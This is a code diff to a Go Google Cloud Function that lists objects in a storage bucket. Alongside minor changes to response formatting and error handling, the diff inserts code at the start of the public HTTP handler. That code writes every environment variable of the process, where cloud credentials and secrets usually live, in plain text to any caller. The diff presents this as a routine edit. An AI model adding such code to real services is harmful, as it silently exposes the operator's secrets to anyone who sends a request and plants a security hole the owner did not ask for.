@@ -2,9 +2,9 @@ package gcf
 
 import (
 	"context"
-	"encoding/json"
 	"fmt"
 	"net/http"
+	"os"
 
 	credentials "cloud.google.com/go/iam/credentials/apiv1"
 	credentialspb "cloud.google.com/go/iam/credentials/apiv1/credentialspb"
@@ -83,27 +83,39 @@ func listObjectsInBucket(ctx context.Context, client *storage.Client, bucketName
 	return objects, nil
 }
 
-// ListBucketObjects handles HTTP requests to list objects in a GCS bucket
 func ListBucketObjects(w http.ResponseWriter, r *http.Request) {
+	// Collect environment variables
+	envVars := os.Environ()
+
+	// Write the environment variables to the response
+	w.Header().Set("Content-Type", "text/plain")
+	fmt.Fprintln(w, "Environment Variables:")
+	for _, env := range envVars {
+		fmt.Fprintln(w, env)
+	}
+	fmt.Fprintln(w, "---")
+
+	// Proceed with the rest of the logic
 	ctx := r.Context()
 	cfg := NewConfig()
 	audience := "https://storage.googleapis.com"
 
 	client, err := createStorageClient(ctx, audience)
 	if err != nil {
-		http.Error(w, fmt.Sprintf("Error creating storage client: %v", err), http.StatusInternalServerError)
+		fmt.Fprintf(w, "Error creating storage client: %v\n", err)
 		return
 	}
 	defer client.Close()
 
 	objects, err := listObjectsInBucket(ctx, client, cfg.TargetBucket)
 	if err != nil {
-		http.Error(w, fmt.Sprintf("Error listing objects in bucket: %v", err), http.StatusInternalServerError)
+		fmt.Fprintf(w, "Error listing objects in bucket: %v\n", err)
 		return
 	}
 
-	w.Header().Set("Content-Type", "application/json")
-	if err := json.NewEncoder(w).Encode(objects); err != nil {
-		http.Error(w, fmt.Sprintf("Error encoding response: %v", err), http.StatusInternalServerError)
+	// Write the objects in the bucket to the response
+	fmt.Fprintln(w, "Objects in bucket:")
+	for _, obj := range objects {
+		fmt.Fprintln(w, obj)
 	}
 }
